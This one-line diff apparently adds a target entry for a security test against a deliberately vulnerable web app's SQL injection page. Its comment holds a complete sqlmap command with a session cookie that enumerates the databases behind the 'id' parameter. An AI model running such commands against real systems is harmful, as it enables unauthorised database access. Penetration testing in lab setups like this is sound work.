@@ -1,0 +1,1 @@
+http://proxy-base:80/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://proxy-base:80/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=9h4ohrbrclhbpmmqmn3o0pglh7; security=low" -p id --batch --dbs --flush-session --level=2 --risk=1
